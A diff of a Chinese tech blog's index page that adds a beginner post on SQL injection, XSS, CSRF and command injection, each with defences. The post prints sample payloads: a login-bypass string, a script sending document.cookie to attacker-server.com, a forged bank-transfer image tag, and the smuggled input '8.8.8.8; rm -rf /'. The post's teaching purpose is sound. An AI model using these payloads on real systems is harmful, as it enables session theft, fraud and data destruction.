@@ -105,7 +105,7 @@
 
 <nav class="site-nav">
   <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/my-blog/" rel="section"><i class="fa fa-home fa-fw"></i>首頁</a>
-  </li><li class="menu-item menu-item-archives"><a href="/my-blog/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>文章<span class="badge">115</span></a>
+  </li><li class="menu-item menu-item-archives"><a href="/my-blog/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>文章<span class="badge">116</span></a>
   </li><li class="menu-item menu-item-tags"><a href="/my-blog/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>標籤<span class="badge">56</span></a>
       <ul class="sub-menu">
   
@@ -351,7 +351,7 @@
     <li class="menu-item-child">
       <a href="/my-blog/tags/OOP/">
         OOP
-        <span class="post-count">(2)</span>
+        <span class="post-count">(3)</span>
       </a>
     </li>
   
@@ -541,7 +541,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/my-blog/archives/">
-          <span class="site-state-item-count">115</span>
+          <span class="site-state-item-count">116</span>
           <span class="site-state-item-name">文章</span>
         </a>
       </div>
@@ -566,6 +566,92 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block post-card">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://nivek-yang.github.io/2025/07/31/%E5%9B%9B%E5%A4%A7%E7%B6%B2%E7%AB%99%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/my-blog/images/avatar.gif">
+      <meta itemprop="name" content="Kaiwii">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="我的技術部落格">
+      <meta itemprop="description" content="分享程式技術">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 我的技術部落格">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/my-blog/2025/07/31/%E5%9B%9B%E5%A4%A7%E7%B6%B2%E7%AB%99%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">
+              一次搞懂 SQL Injection, XSS, CSRF 與 Command Injection 四大網站安全漏洞
+            </a>
+            <a href="/my-blog/2025/07/31/%E5%9B%9B%E5%A4%A7%E7%B6%B2%E7%AB%99%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/" class="card-link-overlay"></a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">發表於</span>
+      
+
+      <time title="創建時間：2025-07-31 00:00:00 / 修改時間：23:28:24" itemprop="dateCreated datePublished" datetime="2025-07-31T00:00:00+08:00">2025-07-31</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分類於</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/my-blog/categories/%E6%8A%80%E8%A1%93%E7%AD%86%E8%A8%98/" itemprop="url" rel="index"><span itemprop="name">技術筆記</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <div class="post-card-content">當我們精心打造一個網站或應用程式時，就像建築師蓋起一棟美麗的房子。我們專注於它的外觀、功能與使用者體驗。但如果忽略了門窗的鎖，再華麗的房子也可能被輕易闖入。在網路世界裡，這些「鎖」就是資訊安全防護。 本篇文章將帶領大家認識四種最常見、也最基礎的網站安全漏洞：SQL Injection、XSS、CSRF 與 Command Injection。它們就像是數位世界裡的小偷與駭客最愛用的幾把萬能鑰匙。 什麼是網站安全漏洞？ 網站安全漏洞（Web Security Vulnerability）是指網站應用程式在設計或實作上的缺陷，讓攻擊者有機會執行惡意行為，例如竊取資料、癱瘓服務，或欺騙使用者。 接下來，我們來逐一說明這四個網站安全漏洞。它們主要屬於「Application Security (應用程式安全)」的範疇，而 Application Security 又是「Cyber Security (資訊安全)」的核心支柱之一。 漏洞的根源：這四種漏洞都源自於應用程式的程式碼撰寫不安全或設計有缺陷。它們不是因為路由器設定錯誤或網路傳輸協定（如 TCP/IP）本身有問題而產生的。 攻擊的層級：它們都發生在 OSI 模型的第 7 層——應用層。攻擊者是透過與網站應用程式互動（例如提交表單、點擊連結）來發動攻擊。 1. SQL Injection (SQL 資料隱碼攻擊) 攻擊原理：當應用程式需要與資料庫溝通時（例如，使用者登入、查詢商品），它會發送 SQL (Structured Query Language) 指令。如果程式沒有妥善過濾使用者的輸入，攻擊者就可以在輸入欄位中「注入」惡意的 SQL 指令，讓資料庫誤以為這是合法的指令，從而執行一些不該做的事。 攻擊情境： 想像一個登入表單，原本的 SQL 查詢可能長這樣： SELECT * FROM users WHERE username = &#x27;使用者輸入的帳號&#x27; AND password = &#x27;使用者輸入的密碼&#x27;; 如果攻擊者在密碼欄位輸入 ' OR '1'='1，整個 SQL 指令就會變成： SELECT * FROM users WHERE username = &#x27;some_user&#x27; AND password = &#x27;&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;; 由於 '1'='1' 永遠為真（True），這個查詢條件就相當於「密碼無論如何都正確」，攻擊者因此成功繞過驗證，直接登入系統。更糟的是，他們還可能用來刪除整個資料庫 (DROP TABLE)！ 防禦策略： 參數化查詢 (Parameterized Queries) / 預處理陳述 (Prepared Statements)：這是最有效的方法。它會先將 SQL 指令的「模板」發送到資料庫，再把使用者的輸入當作「參數」傳入。這樣一來，資料庫就能明確區分「指令」和「資料」，惡意輸入只會被當成純文字資料，無法被執行。 輸入驗證 (Input Validation)：檢查使用者輸入的格式是否符合預期（例如，信箱格式、數字格式）。 2. Cross-Site Scripting (XSS, 跨站腳本攻擊) 如果說 SQL Injection 攻擊的是「後端資料庫」，那麼 XSS 攻擊的目標就是「前端使用者」。 攻擊原理：攻擊者將惡意的 JavaScript 腳本注入到一個網站中。當其他使用者瀏覽到含有這段惡意腳本的頁面時，腳本就會在使用者的瀏覽器上執行。 攻擊情境： 在一個有留言板功能的網站上，攻擊者發表了一篇含有惡意腳本的留言： &lt;p&gt;這是一篇很棒的文章！&lt;/p&gt; &lt;script&gt; // 這段惡意腳本會竊取你的 cookie 並傳送到攻擊者的伺服器 fetch(&#x27;https://attacker-server.com/steal?cookie=&#x27; + document.cookie); &lt;/script&gt; 當下一個訪客（例如你）瀏覽這篇留言時，瀏覽器會毫不懷疑地執行這段 &lt;script&gt;。攻擊者就能輕易偷走你的登入憑證 (Session Cookie)，冒用你的身份進行操作。 防禦策略： 輸出編碼 (Output Encoding)：這是防禦 XSS 的關鍵。在將使用者輸入的內容顯示到頁面上之前，必須對特殊字元進行編碼。例如，將 &lt; 轉換成 &amp;lt;，將 &gt; 轉換成 &amp;gt;。如此一來，瀏覽器只會將其當作純文字顯示，而不是執行它。 內容安全策略 (Content Security Policy, CSP)：透過設定 HTTP Header，告訴瀏覽器只信任並執行來自指定來源的腳本，有效阻擋非預期的腳本執行。 3. Cross-Site Request Forgery (CSRF, 跨站請求偽造) CSRF 是一種非常狡猾的攻擊，它「借用」了你的身份去辦壞事。 攻擊原理：攻擊者誘騙一個已經登入某網站的使用者，在不知情的情況下，點擊一個惡意連結或載入一個惡意頁面。這個惡意頁面會向使用者已登入的網站發送一個偽造的請求（Request）。由於這個請求是從使用者自己的瀏覽器發出的，且會自動帶上該網站的 Cookie，因此被攻擊的網站會認為這是使用者本人的合法操作。 攻擊情境： 登入了網路銀行 mybank.com。 接著，收到一封 Email，標題是「快來看可愛貓咪！」，裡面有一個連結指向 evil-cat-site.com。 點擊了連結，evil-cat-site.com 的頁面裡藏了一段程式碼，例如一個看不見的圖片：&lt;img src=&quot;https://mybank.com/transfer?to=attacker&amp;amount=10000&quot; width=&quot;1&quot; height=&quot;1&quot;&gt; 瀏覽器為了載入這張「圖片」，會向 mybank.com 發出一個轉帳請求，並且自動附上你的登入 Cookie。 銀行伺服器收到請求，驗證 Cookie 後認為是你本人的操作，於是就把錢轉出去了。整個過程你可能毫無察覺。 防禦策略： 使用 Anti-CSRF Token：這是在伺服器端產生一個隨機、無法預測的 Token，並將其放在表單中。當使用者提交表單時，伺服器會驗證這個 Token 是否正確。由於攻擊者在 evil-cat-site.com 上無法得知這個 Token，他偽造的請求就會因為缺少或 Token 錯誤而被拒絕。 檢查 Referer Header：檢查請求的來源頁面是否為合法的網域，但此方法可能被繞過。 使用 SameSite Cookie 屬性：將 Cookie 設置為 SameSite=Strict 或 SameSite=Lax，可以限制 Cookie 在跨站請求中被發送，是現今瀏覽器的主流防禦方式之一。 4. Command Injection (命令注入攻擊) 這種攻擊的危險性與 SQL Injection 不相上下，但它攻擊的目標是「伺服器的作業系統」。 攻擊原理：當應用程式需要呼叫作業系統的命令（例如 ping、ls、rm 等），且直接將使用者的輸入作為命令的一部分時，攻擊者可以注入額外的系統命令，讓伺服器執行意料之外的操作。 攻擊情境： 網站提供一個功能，讓使用者可以 PING 一個 IP 位址來檢查網路狀況。後端程式碼可能是這樣的 (以 PHP 為例)： $ip = $_POST[&#x27;ip_address&#x27;]; system(&quot;ping -c 4 &quot; . $ip); 如果攻擊者輸入的 IP 是 8.8.8.8; rm -rf /，那麼在伺服器上執行的命令就會變成： ping -c 4 8.8.8.8; rm -rf / 系統會先執行合法的 PING 指令，然後接著執行 rm -rf /（刪除根目錄下所有檔案）這個毀滅性的指令。 防禦策略： 避免直接呼叫系統命令：盡可能使用語言內建的函式庫或 API 來完成功能，而不是拼接字串去呼叫系統命令。這是最安全的做法。 嚴格的輸入白名單 (Whitelist)：如果非得使用系統命令，務必建立一個「白名單」，只允許輸入符合特定格式的字元（例如，只允許數字和點 .），過濾掉所有其他特殊字元（如 ;, |, &amp; 等）。 四大網路安全漏洞比較 漏洞類型 攻擊目標 攻擊手法簡述 主要防禦策略 SQL Injection 後端資料庫 在使用者輸入中注入惡意 SQL 指令，欺騙資料庫執行。 參數化查詢 (Prepared Statements) XSS 前端使用者瀏覽器 在網頁中注入惡意 JavaScript，在他人瀏覽器上執行。 輸出內容編碼 (Output Encoding) CSRF 已登入的使用者 誘騙使用者點擊連結，以其身份向伺服器發送偽造請求。 使用 Anti-CSRF Token Command Injection 伺服器作業系統 在使用者輸入中注入惡意系統命令，讓伺服器執行。 避免呼叫系統命令 / 嚴格白名單驗證 總結 網站安全是一場永無止境的攻防戰。今天介紹的四種漏洞只是冰山一角，但它們是每個開發者都必須掌握的基礎知識。了解攻擊者的思維，才能更好地設計出堅不可摧的防禦工事。 記住，安全的程式碼不是「寫完就好」，而是在開發的每一個環節中，都將安全性放在心上。讓我們一起努力，打造一個更安全、更值得信賴的網路世界！</div>
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-card-readmore">
+          <a href="/my-blog/2025/07/31/%E5%9B%9B%E5%A4%A7%E7%B6%B2%E7%AB%99%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/" class="btn">
+            閱讀全文 &raquo;
+          </a>
+        </div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1330,98 +1416,6 @@
     <footer class="post-footer">
         <div class="post-card-readmore">
           <a href="/my-blog/2025/07/22/%E9%9B%86%E4%B8%AD%E5%BC%8F%E8%88%87%E5%88%86%E6%95%A3%E5%BC%8F%E7%B3%BB%E7%B5%B1%E5%B7%AE%E5%88%A5/" class="btn">
-            閱讀全文 &raquo;
-          </a>
-        </div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block post-card">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://nivek-yang.github.io/2025/07/21/%E8%A7%A3%E6%9E%90%20Message%20Queues%20%E8%88%87%20PubSub%20%E7%9A%84%E5%B7%AE%E5%88%A5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/my-blog/images/avatar.gif">
-      <meta itemprop="name" content="Kaiwii">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="我的技術部落格">
-      <meta itemprop="description" content="分享程式技術">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | 我的技術部落格">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/my-blog/2025/07/21/%E8%A7%A3%E6%9E%90%20Message%20Queues%20%E8%88%87%20PubSub%20%E7%9A%84%E5%B7%AE%E5%88%A5/" class="post-title-link" itemprop="url">
-              解析 Message Queues 與 Pub/Sub 的差別
-            </a>
-            <a href="/my-blog/2025/07/21/%E8%A7%A3%E6%9E%90%20Message%20Queues%20%E8%88%87%20PubSub%20%E7%9A%84%E5%B7%AE%E5%88%A5/" class="card-link-overlay"></a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">發表於</span>
-
-      <time title="創建時間：2025-07-21 00:00:00" itemprop="dateCreated datePublished" datetime="2025-07-21T00:00:00+08:00">2025-07-21</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新於</span>
-      <time title="修改時間：2025-07-22 00:13:31" itemprop="dateModified" datetime="2025-07-22T00:13:31+08:00">2025-07-22</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分類於</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/my-blog/categories/%E6%8A%80%E8%A1%93%E7%AD%86%E8%A8%98/" itemprop="url" rel="index"><span itemprop="name">技術筆記</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <div class="post-card-content">在現代分散式系統架構中，非同步訊息傳遞是實現服務解耦、提升系統擴展性與可靠性的關鍵。而在眾多訊息傳遞模式中，Message Queues (消息隊列) 與 Publish-Subscribe (發布/訂閱，簡稱 Pub/Sub) 是最常被討論也最容易被混淆的兩種。本文將深入探討這兩種模式的核心差異、應用場景及各自的優缺點，幫助在系統設計時做出更明智的選擇。 關於術語的重要說明 在深入探討之前，必須澄清一個常見的混淆點。術語「Message Queue」常被用於兩種不同的語境： 作為一種設計模式 (Pattern)：特指本文將要介紹的「點對點」一對一訊息傳遞模型。 作為一類技術產品 (Technology)：泛指像 RabbitMQ、Apache Kafka、AWS SQS 等訊息中介軟體 (Message-Oriented Middleware)。 值得注意的是，大多數我們稱為「Message Queue」的技術產品，其功能非常強大，通常同時支援「點對點的佇列模式」和「一對多的發布/訂閱模式」。本文為了清晰地比較這兩種核心設計理念，將嚴格按照設計模式進行劃分，分別探討「Message Queue (點對點模式)」與「Pub/Sub (發布/訂閱模式)」的差異。 什麼是 Message Queue？ Message Queue (MQ) 遵循的是「點對點」(point-to-point) 的通訊模型、消費者競爭 (Competing Consumers) 模式。在這個模型中，訊息的生產者 (Producer) 將訊息發送到一個佇列 (Queue)，而消費者 (Consumer) 則從這個佇列中取出並處理訊息。 核心特性： 一對一消費與負載平衡：一則訊息只會被一個消費者成功處理，這是此模式的黃金法則。即使有多個消費者（通常是同一個服務的多個實例）同時監聽同一個佇列，佇列中的一則訊息也只會被其中一個消費者取出處理。這種機制被稱為「競爭消費者」(Competing Consumers)，是實現任務分發與負載平衡的關鍵。 訊息保留與確認：訊息在被消費者成功處理並發出確認 (Acknowledgement) 之前，會一直保留在佇列中，確保訊息不會遺失。如果消費者處理失敗，訊息可以被放回佇列由其他消費者處理。 任務導向：此模式的意圖是委派一個任務。生產者不關心是哪個消費者執行，只關心這個任務最終會被完成。 順序性：在許多使用案例中，Message Queue 能確保訊息的先進先出 (FIFO)，不過實際的傳遞順序有時會依據實作與設定而異。 理想應用場景： 任務分發與負載平衡：當需要將耗時的任務分配給多個背景工作者 (Worker) 處理時，Message Queue 是絕佳選擇。 非同步處理：將非必要的任務（如寄送電子郵件、產生報表）丟入佇列，讓主要應用程式能立即回應使用者請求，提升反應速度。 流量削峰：在高併發場景下，利用佇列作為緩衝區，可以避免瞬間流量衝垮後端服務。 流程圖：競爭消費者模型 這個流程圖展示了典型的「競爭消費者」場景。多個背景工作者實例監聽同一個任務佇列，並從中競爭任務來執行，實現了工作負載的均衡。 sequenceDiagram participant Producer as 生產者 (Producer) participant Queue as 訊息佇列 (Queue) participant ConsumerA as 消費者 A (Consumer A) participant ConsumerB as 消費者 B (Consumer B) autonumber Producer-&gt;&gt;+Queue: 發送訊息 M1 note right of Producer: 訊息 M1 進入佇列等待處理 Producer-&gt;&gt;+Queue: 發送訊息 M2 note right of Producer: 訊息 M2 進入佇列等待處理 alt 訊息處理 Queue--&gt;&gt;-ConsumerA: 分派訊息 M1 note left of ConsumerA: 消費者 A 取得 M1 並開始處理 Queue--&gt;&gt;-ConsumerB: 分派訊息 M2 note right of ConsumerB: 消費者 B 取得 M2 並開始處理 end ConsumerA-&gt;&gt;Queue: 確認 (Ack) M1 處理完畢 ConsumerB-&gt;&gt;Queue: 確認 (Ack) M2 處理完畢 這個模式的核心是 工作分發 和 負載均衡。 發送訊息：生產者產生了兩則訊息 (M1, M2) 並把它們發送到同一個訊息佇列中。 訊息分派：佇列將訊息 M1 分派給了消費者 A，同時將訊息 M2 分派給了消費者 B。關鍵點在於，M1 不會再被 B 處理，M2 也不會再被 A 處理。 處理與確認：消費者各自處理完訊息後，會向佇列發送一個「確認 (Acknowledgement)」，通知佇列該訊息已被成功處理，可以從佇列中永久移除了。 什麼是 Publish-Subscribe (Pub/Sub)？ 當需求從「把工作分給下一個有空的人」變成「把消息告訴所有關心這件事的人」時，就跨入了 Pub/Sub 的領域。 Publish-Subscribe (Pub/Sub) 是一種「一對多」的廣播模型。在此模型中，發布者 (Publisher) 將訊息（或事件）發布到一個特定的「主題」(Topic)，所有訂閱了該主題的訂閱者 (Subscriber) 都會收到這則訊息的副本並各自處理。 核心特性： 一對多通訊：一則訊息可以被多個訂閱者接收並各自處理。 發布者與訂閱者之間是解耦的，發布者不需要知道有誰訂閱了訊息，甚至不知道是否有任何訂閱者存在。 事件導向：此模式的意圖是廣播一個事件。發布者只是在宣告「某件事發生了」（例如：使用者下單了），而不關心後續誰會對這個事件做出反應，也不關心反應是什麼。 主題式分類：訊息是依據「主題」進行分類的，訂閱者可以選擇性地訂閱感興趣的主題。 即時性：Pub/Sub 通常被用於即時事件的通知與傳播，採取的是「即發即忘」(fire-and-forget) 的模式，可靠性保障通常較 Message Queue 低。 理想應用場景： 事件驅動架構 (Event-Driven Architecture)：當系統中某個狀態發生改變時（例如：使用者下單），透過 Pub/Sub 將此「事件」通知給所有相關的不同微服務（如庫存服務、通知服務、數據分析服務）。 即時通知：應用於推播通知、即時聊天、股價更新等需要將單一事件廣播給大量使用者的場景。 數據扇出 (Data Fan-out)：將一份數據（如 IoT 感測器數據）同時發送給多個後端系統進行儲存、分析和監控。 流程圖 這個流程圖展示了「一對多」的廣播模式。不同的服務訂閱同一個主題，當事件發生時，它們都會收到通知並執行各自的業務邏輯。 sequenceDiagram participant Publisher as 發布者 participant Topic as 主題 (Topic/Exchange) participant QueueA as 佇列 A (給庫存服務) participant QueueB as 佇列 B (給通知服務) participant StockService as 庫存服務 participant NotificationService as 通知服務 autonumber Publisher-&gt;&gt;Topic: 發布「使用者下單」事件 note over Topic, QueueB: Topic 將事件扇出 (Fan-out) 給所有訂閱者 par Topic--&gt;&gt;QueueA: 複製事件到佇列 A and Topic--&gt;&gt;QueueB: 複製事件到佇列 B end QueueA--&gt;&gt;StockService: 傳遞事件 StockService-&gt;&gt;StockService: 處理：扣減庫存 QueueB--&gt;&gt;NotificationService: 傳遞事件 NotificationService-&gt;&gt;NotificationService: 處理：寄送 E-mail 發布事件：發布者向主題發布一個 E1 事件。 並行廣播 (par…end)：par 區塊表示動作是同時發生的。主題將事件並行地廣播給所有訂閱者。 獨立處理：每個訂閱者在收到事件後，開始執行各自的內部邏輯，彼此之間互不干擾。 核心差異總結 特性 Message Queue Publish-Subscribe (Pub/Sub) 核心意圖 任務導向 (Task-Oriented) 事件導向 (Event-Oriented) 通訊模型 點對點 (一對一) 發布/訂閱 (一對多) 訊息消耗 一則訊息只被一個消費者處理。 一則訊息會被所有訂閱者處理。 耦合度 生產者與單一消費者解耦。 發布者與多個訂閱者完全解耦。 可靠性 可靠性高，通常有訊息確認機制。 可靠性相對較低，可能因訂閱者離線而遺失訊息。 主要用途 任務分發、負載平衡、非同步處理。 事件廣播、即時通知、數據串流。 備註: 雖然 Pub/Sub 可以配置為「即發即忘」(fire-and-forget) 模式，但現代主流系統（如 Kafka, RabbitMQ）通常會為訂閱者維護獨立的佇列或日誌偏移量 (offset)，確保即使訂閱者短暫離線，也能在重新上線後接收到錯過的訊息，實現高可靠性。 如何選擇？ 選擇 Message Queue 還是 Pub/Sub，完全取決於具體需求： 如果需要確保每一項任務都只被執行一次，並且希望在多個工作者之間分攤處理壓力，那麼 Message Queue 是首選。 如果需要將一個事件通知給多個不同的處理單元，並且強調服務間的完全解耦與即時性，那麼 Pub/Sub 會是更合適的模式。 在某些複雜的系統中，甚至會將兩者結合使用。例如，一個服務透過 Pub/Sub 接收到事件通知後，再將具體的處理任務放入 Message Queue 中，交由後端工作者執行。 結論 Message Queues 和 Pub/Sub 都是構成現代化分散式系統的重要基石。理解它們之間最根本的差異——「一對一」的任務導向與「一對多」的事件廣播——是設計出高效、可擴展且穩健系統的第一步。希望本文釐清了術語上的混淆，並能幫助你在未來的技術選型中，更有信心地從設計意圖出發，做出正確的決策。</div>
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-card-readmore">
-          <a href="/my-blog/2025/07/21/%E8%A7%A3%E6%9E%90%20Message%20Queues%20%E8%88%87%20PubSub%20%E7%9A%84%E5%B7%AE%E5%88%A5/" class="btn">
             閱讀全文 &raquo;
           </a>
         </div>
